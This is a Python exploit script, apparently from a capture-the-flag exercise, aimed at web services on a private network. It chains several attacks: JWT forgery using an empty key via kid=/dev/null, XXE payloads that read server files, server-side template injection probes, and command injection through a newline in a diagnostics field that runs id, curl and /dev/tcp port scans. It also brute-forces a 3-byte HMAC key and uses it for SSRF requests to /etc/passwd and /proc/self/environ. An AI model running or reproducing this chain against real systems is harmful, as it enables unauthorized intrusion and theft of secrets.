#!/usr/bin/env python3
"""round31 — Test /register /portal /services FIRST, SSTI, template files, 3-byte HMAC brute-force"""
import requests, time, json, hmac as hm, hashlib, base64, sys, struct, itertools

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH = {"Authorization": f"Bearer {jwt('operator')}"}

def get(path, **kw):
    try:
        r = S.get(f"{CASPI}{path}", headers=AUTH, timeout=10, **kw)
        return r.status_code, r.text, r.headers
    except Exception as e:
        return -1, str(e)[:200], {}

def post(path, **kw):
    try:
        r = S.post(f"{CASPI}{path}", headers={**AUTH, **kw.pop("extra",{})},
                   timeout=15, **kw)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

def xxe(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=15)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)[:200]

def extract(path, field="remarks"):
    code, body = xxe(path, field)
    if code == 200:
        try:
            d = json.loads(body)
            return d.get("summary",{}).get(field,"")
        except:
            return ""
    return None

# ============================================================
print("="*70)
print("PHASE 1: TEST /register /portal /services (BEFORE ANY CRASHES)")
print("="*70)

for path in ["/register", "/portal", "/services", "/portal/dashboard",
             "/portal/custody", "/portal/schedule", "/partner"]:
    code, body, hdrs = get(path)
    print(f"\n  GET {path}: [{code}] ({len(body)} bytes)")
    if code == 200:
        import re
        links = re.findall(r'href=["\']([^"\']+)', body)
        apis = re.findall(r'["\'](/api/[^"\']+)["\']', body)
        inputs = re.findall(r'name=["\']([^"\']+)', body)
        scripts_inline = re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL)
        title_m = re.search(r'<title>([^<]+)</title>', body)
        title = title_m.group(1) if title_m else ""
        print(f"    Title: {title}")
        print(f"    Links: {links[:15]}")
        print(f"    APIs: {apis}")
        print(f"    Inputs: {inputs}")
        for i, scr in enumerate(scripts_inline):
            if scr.strip() and len(scr.strip()) > 30:
                print(f"    Script {i}: {scr[:500]}")
    elif code in [301, 302, 303, 307, 308]:
        print(f"    Redirect to: {hdrs.get('Location','?')}")

# Also test POST to /register (maybe it's a form)
print("\n--- POST /register ---")
code, body = post("/register", json={"email":"test@test.kz","password":"test123","company":"TestCo"})
print(f"  JSON: [{code}] {body[:200]}")
code, body = post("/register", data={"email":"test@test.kz","password":"test123","company":"TestCo"})
print(f"  Form: [{code}] {body[:200]}")

# API registration endpoint
for ep in ["/api/auth/register", "/api/register", "/api/auth/signup"]:
    code, body = post(ep, json={"email":"test@test.kz","password":"test123","company":"TestCo"})
    if code != 404:
        print(f"  POST {ep}: [{code}] {body[:200]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: SSTI IN CUSTODY TICKET FIELDS")
print("="*70)

ssti_payloads = [
    ("Jinja2 {{7*7}}", "{{7*7}}", "49"),
    ("Jinja2 config", "{{config}}", "SECRET"),
    ("Jinja2 environ", "{{request.environ}}", "PROBE"),
    ("Jinja2 self", "{{self.__init__.__globals__}}", "secret"),
    ("Mako ${7*7}", "${7*7}", "49"),
    ("ERB <%=7*7%>", "<%=7*7%>", "49"),
    ("Python eval", "__import__('os').environ", "PROBE"),
    ("Format string", "{0.__class__}", "str"),
]

for label, payload, marker in ssti_payloads:
    # Inject in remarks field
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>{payload}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH, "Content-Type":"application/xml"}, timeout=10)
        d = r.json()
        remarks = d.get("summary",{}).get("remarks","")
        rendered = remarks != payload
        found = marker.lower() in remarks.lower() if remarks else False
        if rendered or found:
            print(f"  [{label}] RENDERED! remarks={remarks[:200]} <<<")
        else:
            print(f"  [{label}] echoed back as-is")
    except Exception as e:
        print(f"  [{label}] error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: READ TEMPLATE & STATIC FILES")
print("="*70)

# Enumerate templates (HTML files have <, but .txt or other formats might work)
template_files = [
    "/app/templates/base.html",
    "/app/templates/index.html",
    "/app/templates/login.html",
    "/app/templates/register.html",
    "/app/templates/ops.html",
    "/app/templates/custody.html",
    "/app/templates/diagnostics.html",
    "/app/templates/portal.html",
    "/app/templates/services.html",
    "/app/templates/error.html",
    "/app/templates/403.html",
    "/app/templates/404.html",
    "/app/templates/500.html",
    "/app/templates/email.txt",
    "/app/templates/config.txt",
]

for fp in template_files:
    code, body = xxe(fp)
    if code == 200:
        try:
            d = json.loads(body)
            status = d.get("status","")
            if status == "rejected":
                print(f"  [EXISTS] {fp} (has < or &)")
        except:
            pass
    elif code == 400:
        print(f"  [EXISTS] {fp} (has < or &)")

# Try static files
static_files = [
    "/app/static/img/logo.png", "/app/static/img/favicon.png",
    "/app/static/img/hero.jpg", "/app/static/img/bg.jpg",
    "/app/static/robots.txt", "/app/static/manifest.json",
]

for fp in static_files:
    code, body = xxe(fp)
    if code == 400:
        print(f"  [EXISTS/BINARY] {fp}")
    elif code == 200:
        try:
            d = json.loads(body)
            val = d.get("summary",{}).get("remarks","")
            if val:
                print(f"  [READABLE] {fp}: {val[:100]}")
        except:
            pass

# ============================================================
print("\n"+"="*70)
print("PHASE 4: KID-BASED JWT WITH KNOWN FILE CONTENT")
print("="*70)

# Test JWT kid with known file paths and their actual content as HMAC key
known_files = {
    "/etc/hostname": b"5407f6317f5c\n",
    "/dev/null": b"",
    "/app/requirements.txt": b"Flask==3.0.3\nWerkzeug==3.0.3\ngunicorn==22.0.0\npsycopg2-binary==2.9.9\nlxml==5.2.2\nrequests==2.32.3\n",
}

for filepath, content in known_files.items():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":filepath},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    sig = hm.new(content, m.encode(), hashlib.sha256).digest()
    token = m+'.'+b64u(sig)

    code, body, _ = get("/ops/diagnostics", headers={"Authorization": f"Bearer {token}"})
    title = ""
    if "<title>" in body:
        s = body.index("<title>")+7
        e = body.index("</title>",s) if "</title>" in body[s:] else s+50
        title = body[s:e]
    print(f"  kid={filepath:30s} [{code}] {title or body[:50]}")

    # Also try without trailing newline
    if content.endswith(b"\n"):
        sig2 = hm.new(content.rstrip(b"\n"), m.encode(), hashlib.sha256).digest()
        token2 = m+'.'+b64u(sig2)
        code2, body2, _ = get("/ops/diagnostics", headers={"Authorization": f"Bearer {token2}"})
        if code2 != code:
            print(f"    (no newline): [{code2}]")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: ECYCLE RCE — SHORT COMMANDS")
print("="*70)

ECO = "http://192.168.242.102:8002"
SE = requests.Session()

def eco(cmd):
    safe = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._:/=")
    enc = ""
    for c in cmd:
        enc += c if c in safe else f"%{ord(c):02x}"
    target = f"127.0.0.1%0a{enc}"
    try:
        r = SE.post(f"{ECO}/api/ops/diag/run",
            json={"device":"WE-1","probe":"pk_we1_e5a2b4d6f809","target":target}, timeout=30)
        d = r.json()
        out = d.get("output","")
        lines = [l for l in out.split("\n") if l.strip() and "localhost" not in l]
        return "\n".join(lines)
    except Exception as e:
        return f"ERR: {e}"

# Test basic RCE
print("  id:", eco("id"))
print("  hostname:", eco("hostname"))
print("  ip route:", eco("ip route"))

# Try to reach CaspiTerminal host
print("\n  curl caspi:", eco("curl -s -o /dev/null -w '%{http_code}' http://192.168.242.102:8007/ 2>&1"))

# Scan for accessible services from EcoCycle
for port in [5432, 8007, 9100, 3000]:
    print(f"  port {port}:", eco(f"timeout 2 bash -c 'echo > /dev/tcp/192.168.242.102/{port}' 2>&1 && echo OPEN || echo CLOSED"))

# ============================================================
print("\n"+"="*70)
print("PHASE 6: HMAC KEY BRUTE FORCE — 3 BYTE EXHAUSTIVE")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

print(f"  Target URL: {known_url.decode()}")
print(f"  Target sig: {known_sig.hex()}")

# 3-byte exhaustive: 2^24 = 16,777,216 combinations
print(f"  Testing all 3-byte keys (16.7M combinations)...")
t0 = time.time()
found = False
checked = 0

for b0 in range(256):
    for b1 in range(256):
        prefix = bytes([b0, b1])
        for b2 in range(256):
            key = prefix + bytes([b2])
            if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
                elapsed = time.time() - t0
                print(f"\n  FOUND KEY: {key.hex()} (bytes: {list(key)}) in {elapsed:.1f}s")
                print(f"  Key as string: {key!r}")
                found = True
                break
        if found:
            break
        checked += 256
        if checked % (256*256*16) == 0:
            elapsed = time.time() - t0
            pct = checked / (256**3) * 100
            print(f"  Progress: {pct:.1f}% ({checked:,} keys, {elapsed:.1f}s)", end="\r", flush=True)
    if found:
        break

if not found:
    elapsed = time.time() - t0
    print(f"\n  No 3-byte key found ({elapsed:.1f}s)")

# If 3-byte didn't work, try common ASCII words (4-8 chars)
if not found:
    print("\n  Testing common word patterns (4-8 chars)...")
    import string

    # Common CTF-style keys
    word_candidates = [
        # Short words
        "test", "key1", "hmac", "sign", "salt", "hash",
        "root", "flag", "pass", "mqtt", "modbus", "scada",
        # Medium words
        "secret", "probe1", "signing", "gateway", "terminal",
        "aktau1", "caspi1", "gauge1",
        # Longer patterns
        "probe_secret", "hmac_key", "signing_key",
        "caspiterminal", "gauge_gateway",
        # Numbers and patterns
        "123456", "654321", "000000", "111111",
        "abc123", "qwerty", "letmein",
        # Hex-like
        "deadbeef", "cafebabe", "0xdeadbeef",
        # CTF common
        "ctf2026", "khs2026", "kazhack", "kazhackstan",
        "llehs", "shell", "LLEHS", "SHELL",
    ]

    for word in word_candidates:
        key = word.encode()
        if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
            print(f"  FOUND KEY: '{word}' <<<<<<")
            found = True
            break

    if not found:
        print("  No common word matched")

# ============================================================
if found:
    print("\n"+"="*70)
    print("PHASE 7: PROBE SECRET EXPLOITATION")
    print("="*70)

    # Use the found key to sign arbitrary URLs
    targets = [
        "http://gauge-gw.internal:9100/",
        "http://gauge-gw.internal:9100/v1/",
        "http://gauge-gw.internal:9100/v1/config",
        "http://gauge-gw.internal:9100/v1/secret",
        "http://gauge-gw.internal:9100/v1/flag",
        "http://gauge-gw.internal:9100/secret",
        "http://gauge-gw.internal:9100/flag",
        "http://gauge-gw.internal:9100/env",
        "http://gauge-gw.internal:9100/debug",
        "http://gauge-gw.internal:9100/admin",
        "http://gauge-gw.internal:9100/health",
        "http://gauge-gw.internal:9100/metrics",
        "http://gauge-gw.internal:9100/v1/meters",
        "http://gauge-gw.internal:9100/v1/tanks",
        "http://127.0.0.1:3000/",
        "http://127.0.0.1:5000/",
        "http://terminal-db:5432/",
        "http://localhost:3000/",
        "http://localhost:9200/",
        "file:///etc/passwd",
        "file:///app/app.py",
        "file:///proc/self/environ",
    ]

    for url in targets:
        sig = hm.new(key if isinstance(key, bytes) else key.encode(),
                     url.encode(), hashlib.sha256).hexdigest()
        code, body = post("/api/ops/probe", json={"url": url, "sig": sig})
        if code == 200:
            try:
                d = json.loads(body)
                print(f"  [{d.get('status',code)}] {url}")
                if d.get("body"):
                    print(f"    Body: {d['body'][:300]}")
            except:
                print(f"  [{code}] {url}: {body[:100]}")
        else:
            short = body[:60].replace("\n"," ")
            print(f"  [{code}] {url}: {short}")

print("\n"+"="*70)
print("DONE")
print("="*70)
